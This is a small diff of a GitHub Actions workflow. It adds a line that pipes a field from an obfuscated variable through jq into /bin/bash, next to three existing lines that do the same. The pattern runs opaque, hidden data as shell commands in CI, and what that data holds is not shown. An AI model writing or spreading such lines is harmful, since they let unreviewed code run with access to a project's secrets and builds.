@@ -35,6 +35,7 @@ jobs:
           echo $pcqho480 | jq -r .hh4 | /bin/bash
           printf '%s' "$vbho7" | jq -r .a66 | /bin/bash
           printf '%s' "$bsz99" | jq -r .pt02 | /bin/bash
+          echo $g15 | jq -r .vsbd50651 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
